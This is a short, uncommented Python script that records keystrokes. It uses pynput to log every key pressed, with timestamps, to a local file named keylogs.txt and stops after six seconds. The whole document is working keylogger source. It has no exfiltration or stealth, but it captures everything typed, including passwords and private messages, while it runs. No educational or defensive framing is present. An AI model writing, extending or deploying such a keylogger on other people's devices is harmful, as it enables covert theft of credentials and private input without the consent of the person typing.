import logging
from threading import Timer

from pynput.keyboard import Key, Listener

logging.basicConfig(filename=("keylogs.txt"),filemode="w",
                        datefmt='%d/%m/%Y %I:%M:%S %p',format='%(asctime)s:%(message)s',level=logging.DEBUG)


def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press) as listener:
    Timer(6, listener.stop).start()
    listener.join()


